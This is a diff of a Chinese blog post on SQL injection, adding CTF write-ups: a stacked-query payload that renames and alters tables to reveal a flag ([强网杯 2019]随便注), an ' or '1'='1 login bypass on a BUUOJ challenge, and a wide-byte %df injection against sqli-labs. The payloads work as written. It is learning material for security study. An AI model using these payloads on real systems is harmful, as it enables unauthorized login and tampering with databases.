@@ -446,14 +446,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    7.9k
+                    9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    31 分
+                    35 分
                 </div>
                 
 
@@ -754,6 +754,57 @@ Referer: 1        #这样才对
 <p>单引号前有一个反斜杠，我们的单引号被过滤掉了，下一行hint：The Query String you input in Hex becomes : 315c27，我们输入的id=1\‘的编码时这么多，我们知道，反斜杠的编码时%5c，如果我们在其之前加入另外的编码使其成为宽字节，就可以去掉反斜杠了，查询GBK的范围，选择一个，%df，这样df5c属于宽字节，加入%df后形成的新字节被MYSQL忽视，反斜杠也没了，这样我们的单引号就又起作用了，具体语法为<code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1%df&#39;</code></p>
 <p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=-1%df&#39; union select 1,2,database() %23</code></p>
 <p>这样已经成功注入了。后续不表</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>简单来说就是在一个语句后面加上分号<code>;</code>,这代表着这一条语句的结束，分号后面继续写别的语句，这样我们写的语句就会和前面的语句一起执行，比如</p>
+<p><code>select * from user where id =1;select * from data</code></p>
+<p>在id后加上一个分号，就可以继续执行下一条。</p>
+<blockquote>
+<p>但是并不是说堆叠注入所有时候都可以用</p>
+<ul>
+<li>可能受到 API或者数据库引擎 不支持的限制，此外，在权限不足的情况也不能成功执行。</li>
+<li>虽然堆叠查询可以执行任意的 sql 语句，但是页面一般只能显示前一条语句执行结果，第二条语句我们无法得知它是否执行成功，第二个语句产生错误或者结果只能被忽略。</li>
+</ul>
+</blockquote>
+<p>和union执行的区别就是union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。比如insert或者delete语句，很多时候我们会在堆叠注入中使用<code>show</code>语句，来查看我们想要的数据，比如 show databases;以及<code>desc</code>命令,用于查看表结构的详细信息，比如 desc flag;**有的时候desc后的值需要使用反引号包裹。</p>
+<p>这里记录[[强网杯 2019]随便注 1]的一道题目writeup</p>
+<p>使用的就是堆叠注入以及一些骚操作<strong>其实主要是我对sql语句并不熟练，只会一些最基本的</strong>，来看一下这一题</p>
+<p>使用单引号，报错，加–+消除成功，order by，但union的时候返回了select被过滤的情况，怎么也绕不过去，看到使用?inject=1’ or 1=1 #可以看到更多的信息，接下来使用堆叠注入，首先inject=1’;show databases;可以看到数据库，show tables；看到两张表</p>
+<p><img src="/images/image-20201008193146206.png" alt="两张表"></p>
+<p>使用 desc分别查看，</p>
+<p>?inject=1’;desc words;</p>
+<p>?inject=1’;desc `1919810931114514`;（这里需要打反引号）</p>
+<p>可以看到flag在数字的这个表里，接下来的就是一些奇异的思路了。通过修改表名和字段名来获取flag，我们可以看到我们只有两个表，一个是words一个是数字的那个，观察当看words的具体内容和最开始的查询</p>
+<p><img src="/images/image-20201008194047954.png" alt="2"></p>
+<p>我们可以猜测正常的时候我们是在查words表里的id，data字段，我们将数字表改为words表，将flag字段改为id字段，就可以查出flag值了，直接给出构造的payload：</p>
+<p>?inject=1’;rename table words to words1;rename table `19198109311145` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</p>
+<p>rename table `words` to `www`;rename table `1919810931114514`  to `words`;alter table words change flag id varchar(100);#</p>
+<p>注意，下面这一行rename时每一个表名都加了反引号，我这里好像要这样才能改表名称，不然会显示words表不存在，以后最好还是都加上；最后用一个 ？inject=1’ or 1=1 –+就可以找到flag了；</p>
+<p>记录一下rename和alter函数</p>
+<pre><code>rename命令格式：rename table 原表名 to 新表名;</code></pre>
+<pre><code>如需在表中添加列，请使用下面的语法:
+ALTER TABLE table_name ADD column_name datatype
+
+如需删除表中的列，请使用下面的语法（请注意，某些数据库系统不允许这种在数据库表中删除列的方式）：
+ALTER TABLE table_name DROP COLUMN column_name
+
+改变列的名称
+alter table table_name change a b integer(这个是数据类型，可以是varchar);
+
+要改变表中列的数据类型，请使用下面的语法：
+
+SQL Server / MS Access：
+ALTER TABLE table_name ALTER COLUMN column_name datatype
+
+My SQL / Oracle：
+ALTER TABLE table_name MODIFY COLUMN column_name datatype
+
+Oracle 10G 之后版本:
+ALTER TABLE table_name MODIFY column_name datatype;
+flag&amp;#123;f28974b4-511c-4c6c-9c76-296efebc02e4&amp;#125;</code></pre>
+<p>+++++++++</p>
+<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>记录一道题的解法，是[极客大挑战 2019]EasySQL的题目，</p>
+<p>登录后发现是get型传递参数，加单引号报错，可以看到是字符型，这里使用了一种<strong>万能密码</strong></p>
+<p><code>http://f8759e96-bef7-4955-bd4e-371420693b66.node3.buuoj.cn/check.php?username=admin&#39;or &#39;1&#39;=&#39;1&amp;password=admin&#39;or &#39;1&#39;=&#39;1</code></p>
+<p>首先使用一个单引号使用户名闭合，这时会判断我们的用户名是错的，然后执行or后面的语句，’1’=’1’成立，密码也这样，就能够登录了。    </p>
 <hr>
 <p>最后简单记录一下sql注入防御手段，</p>
 <ul>
@@ -1318,7 +1369,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">14.1k</span>&nbsp;字
+                class="white-color">15.9k</span>&nbsp;字
             
             
             
